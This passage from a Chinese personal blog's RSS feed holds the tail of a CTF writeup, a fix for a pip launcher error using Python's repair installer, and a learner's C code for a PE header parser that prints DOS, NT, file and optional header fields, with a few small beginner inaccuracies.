	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223543561-402124339_hu11778967037433980069.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223543561-402124339_hu3985247938900507708.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;504&#34;
		data-flex-basis=&#34;1211px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;给了提示我还是不懂啊！&lt;/p&gt;
&lt;p&gt;呜呜呜&lt;/p&gt;
</description>
        </item>
        <item>
        <title>pip报【Fatal_error_in_launcher__Unable_to_create_process_using】</title>
        <link>https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/</link>
        <pubDate>Fri, 28 Aug 2020 02:02:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/</guid>
        <description>&lt;p&gt;想给pycharm加个gmpy2的库，结果不能直接从设置里安装，很气。上网搜，都是手动添加。&lt;/p&gt;
&lt;p&gt;那我也来手动添加，结果发现pip的所有指令都报【Fatal error in launcher: Unable to create process using &amp;lsquo;&amp;quot;&amp;rsquo;】&lt;/p&gt;
&lt;p&gt;然后又去找解决方法，卸载重装都不管事。&lt;/p&gt;
&lt;p&gt;看到一种方法是在python的安装包里选择repair修复，于是我兴冲冲的去官网下载安装包，结果根本没有选项。&lt;/p&gt;
&lt;p&gt;最后我打算卸载py重装的时候，看见了这个：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828095843130-619462023.png&#34;
	width=&#34;573&#34;
	height=&#34;175&#34;
	srcset=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828095843130-619462023_hu4265030985712382864.png 480w, https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828095843130-619462023_hu5419897847218472064.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;327&#34;
		data-flex-basis=&#34;785px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;当机立断点进去&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100038710-1016444260.png&#34;
	width=&#34;832&#34;
	height=&#34;512&#34;
	srcset=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100038710-1016444260_hu5690499344658979524.png 480w, https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100038710-1016444260_hu4531722849064727543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;162&#34;
		data-flex-basis=&#34;390px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100007952-499211909.png&#34;
	width=&#34;435&#34;
	height=&#34;336&#34;
	srcset=&#34;https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100007952-499211909_hu1195587376566159335.png 480w, https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/1858293-20200828100007952-499211909_hu2637016186491231923.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;129&#34;
		data-flex-basis=&#34;310px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我他妈直接repair，然后就修好了，pip姬恢复了被玩坏之前的样子呢~&lt;/p&gt;
</description>
        </item>
        <item>
        <title>C语言的PELode编写记录</title>
        <link>https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Thu, 23 Jul 2020 10:43:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;p&gt;记录一下C语言写的简单的PE文件分析器。&lt;/p&gt;
&lt;p&gt;边学边做的，有些地方有疏漏了还请指点。&lt;/p&gt;
&lt;p&gt;我按照《逆向工程核心原理》这本书给出的大体结构对各部分内容进行输出，下面记录一下我遇到的难题和一些值得注意的点。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分析一个pe文件要做的第一件事就是把这个文件加载到内存中，也就是文件映射。&lt;/p&gt;
&lt;p&gt;这里我用的代码是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;char&lt;/strong&gt; FilePath[] = &amp;ldquo;E:\\test\\notepad.exe&amp;rdquo;;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;HANDLE&lt;/strong&gt; hFile = CreateFileA(FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;HANDLE&lt;/strong&gt; hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PVOID&lt;/strong&gt; pbFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;把FilePath[]内容改成需要分析的pe文件的路径即可。&lt;/p&gt;
&lt;p&gt;然后我们准备分析一个文件的DOS头、NT头、输入表输出表，其他内容暂且不分析。&lt;/p&gt;
&lt;p&gt;一个DOS头的内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246634-1196235897.png&#34;
	width=&#34;575&#34;
	height=&#34;296&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246634-1196235897_hu18207414836885374302.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246634-1196235897_hu15912363005434707315.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;466px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;作为一个结构体，每个PE文件的DOS头长度不定，但是e_lfanew的值应该都是3cH。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如何找到并输出DOS头。&lt;/p&gt;
&lt;p&gt;在网络上搜集各种资料观察各种大牛的代码后我发现，当我把文件映射之后，可以直接定义DOS头的入口：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246944-518344621.png&#34;
	width=&#34;419&#34;
	height=&#34;20&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246944-518344621_hu11462342658720292058.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184246944-518344621_hu2782971727908549728.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2095&#34;
		data-flex-basis=&#34;5028px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这也让我对文件的本质和C语言编程多了一些理解，事实上这也是我第一次接触这种很像windows编程的小程序。&lt;/p&gt;
&lt;p&gt;直接用系统已经给出的结构体定义去声明一个DOS头，然后我们就可以以指针的形式去访问内部成员。&lt;/p&gt;
&lt;p&gt;这里我又遇见了第三个问题，实际上这个问题应该是在映射文件前就该遇到了：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;刚开始的时候我并不明白这些DWORD、HANDLE都是些什么东西，查过资料后明白了，不过是和int、char这些东西一样，只是微软把他们typedef成了其他名称，本质还是一些基础的数据定义。&lt;/p&gt;
&lt;p&gt;搞清楚这个之后我们对于DOS头甚至是之后的整体文件就能有个大概的认识了。这些支离破碎的二进制被我们观测为十六进制，再加以联系组成一块一块的结构，最后一起拼接成了一个PE文件。&lt;/p&gt;
&lt;p&gt;访问DOS头的成员：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;==================================PE DOS HEADER===================================&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_magic: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_magic);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_cblp: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_cblp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_cp: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_cp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_crlc: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_crlc);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_cparhdr: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_cparhdr);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_minalloc: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_minalloc);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_maxalloc: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_maxalloc);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_ss: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_ss);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_sp: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_sp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_csum: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_csum);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_ip: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_ip);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_cs: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_cs);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_lfarlc: 0x%04X&amp;quot;, pDosHeader-&amp;gt;e_lfarlc);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_ovno: 0x%04X\n&amp;quot;, pDosHeader-&amp;gt;e_ovno);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; i = 0; i &amp;lt;= 3; i++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;e_res[%d]: 0x%04X &amp;ldquo;,i, pDosHeader-&amp;gt;e_res[i]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_oemid: 0x%04X&amp;rdquo;, pDosHeader-&amp;gt;e_oemid);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_oeminfo: 0x%04X\n&amp;rdquo;, pDosHeader-&amp;gt;e_oeminfo);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; i = 0; i &amp;lt;= 9; i++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;if&lt;/strong&gt; (!(i % 4) &amp;amp;&amp;amp; i) printf(&amp;quot;\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;e_res[%d]: 0x%04X &amp;ldquo;, i, pDosHeader-&amp;gt;e_res2[i]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\ne_lfanew: 0x%08X\n&amp;rdquo;, pDosHeader-&amp;gt;e_lfanew);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;27&#34;&gt;
&lt;li&gt;printf(&amp;quot;\n==================================PE NT HEADER===================================&amp;rdquo;);//大小为F8&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS32)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + pDosHeader-&amp;gt;e_lfanew);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nSignature: 0x%08X&amp;quot;, pNtHeader-&amp;gt;Signature);&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大部分以十六进制的方法输出，小部分需要看一下表示的内容于是便输出为%s或者是%d。&lt;/p&gt;
&lt;p&gt;注意，在文件映射的开始我们定义了一个PVOID的pbFile，这个代表文件的入口，之后我们想要定位NT头或者其他什么内容时需要用到。&lt;/p&gt;
&lt;p&gt;e_lfanew的值就是指从文件开头到NT头的距离，中间可能夹着DOS存根，但是无伤大雅，存根是只有在DOS环境下启动程序才会运行的内容，现在一般用来告诉用户这个软件应该在windows下打开。&lt;/p&gt;
&lt;p&gt;把注意力放在NT头上：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247150-149759809.png&#34;
	width=&#34;570&#34;
	height=&#34;23&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247150-149759809_hu3569066016291340334.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247150-149759809_hu1615924162714944176.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2478&#34;
		data-flex-basis=&#34;5947px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;通过强制类型转化可以找到NT头的起始位置，下面是NT头的内容:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247492-1934575057.png&#34;
	width=&#34;569&#34;
	height=&#34;82&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247492-1934575057_hu1394589010298435806.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247492-1934575057_hu14732677509879109663.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;693&#34;
		data-flex-basis=&#34;1665px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;NT头看着没什么东西，里面其实包含了两个结构体，一个文件头一个可选头。&lt;/p&gt;
&lt;p&gt;NT头的第一个signature是签名，作为PE文件其值为0x50450000，也就是&amp;quot;PE&amp;quot;00&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n==================================PE NT HEADER===================================&amp;quot;);//大小为F8&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS32)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + pDosHeader-&amp;gt;e_lfanew);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nSignature: 0x%08X&amp;quot;, pNtHeader-&amp;gt;Signature);&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;文件头的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247824-1134713541.png&#34;
	width=&#34;576&#34;
	height=&#34;138&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247824-1134713541_hu7758423477811387073.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184247824-1134713541_hu3699237701629020278.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;417&#34;
		data-flex-basis=&#34;1001px&#34;
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;//NT头的file header&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n==================================PE FILE HEADER===================================\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Machine: 0x%04X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.Machine);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;NumberOfSections: 0x%04X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.NumberOfSections); //文件中存在的节区数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;TimeDateStamp: 0x%08X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.TimeDateStamp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;PointerToSymbolTable: 0x%08X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.PointerToSymbolTable);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;NumberOfSymbols: 0x%08X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.NumberOfSymbols);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfOptionalHeader: 0x%04X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.SizeOfOptionalHeader); //指出optional header 的大小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Characteristics: 0x%04X\n&amp;rdquo;, pNtHeader-&amp;gt;FileHeader.Characteristics); //标识文件的属性&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可选头结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184248968-55826475.png&#34;
	width=&#34;576&#34;
	height=&#34;556&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184248968-55826475_hu18336347467361761544.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184248968-55826475_hu14700093583763028839.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;103&#34;
		data-flex-basis=&#34;248px&#34;
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;//NT头的optional header&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n===================================PE OPTIONAL HEADER====================================\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;printf(&amp;ldquo;Machine:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.Magic);&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MajorLinkerVersion:%02X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MajorLinkerVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MinorLinkerVersion:%02X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MinorLinkerVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfCode:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfCode);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfInitializedData:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfInitializedData);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfUninitializedData:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfUninitializedData);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;AddressOfEntryPoint:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.AddressOfEntryPoint); //代码起始位置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;BaseOfCode:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.BaseOfCode);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;BaseOfData:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.BaseOfData);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;ImageBase:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.ImageBase);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SectionAlignment:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SectionAlignment);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;FileAlignment:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.FileAlignment);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MajorOperatingSystemVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MajorOperatingSystemVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MinorOperatingSystemVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MinorOperatingSystemVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MajorImageVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MajorImageVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MinorImageVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MinorImageVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MajorSubsystemVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MajorSubsystemVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MinorSubsystemVersion:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.MinorSubsystemVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Win32VersionValue:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.Win32VersionValue);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfImage:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfImage);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfHeaders:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfHeaders); //整个PE头大小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;CheckSum:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.CheckSum);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Subsystem:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.Subsystem);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;DllCharacteristics:%04X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.DllCharacteristics);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfStackReserve:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfStackReserve);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfStackCommit:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfStackCommit);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfHeapReserve:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfHeapReserve);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;SizeOfHeapCommit:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.SizeOfHeapCommit);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;LoaderFlags:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.LoaderFlags);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;NumberOfRvaAndSizes:%08X\n&amp;rdquo;, pNtHeader-&amp;gt;OptionalHeader.NumberOfRvaAndSizes); //用来指定最后数组的大小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
